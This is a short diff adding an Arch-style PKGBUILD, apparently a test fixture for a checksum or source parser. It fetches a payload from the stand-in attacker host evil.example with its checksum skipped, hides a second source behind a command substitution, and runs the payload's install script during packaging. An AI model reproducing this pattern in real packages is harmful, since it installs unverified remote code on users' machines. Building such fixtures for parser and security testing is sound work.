@@ -1,0 +1,15 @@
+# Maintainer: hijacked <attacker@evil.example>
+pkgname=sumdemo
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="downloads an unverified payload next to an expansion the parser cannot count"
+arch=('any')
+url="https://example.com"
+license=('custom')
+source=('https://evil.example/payload.tar.gz' $(echo https://ok.example/b.txt))
+sha256sums=('SKIP' 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+
+package() {
+    cd "$srcdir"
+    bash ./payload/install.sh
+}
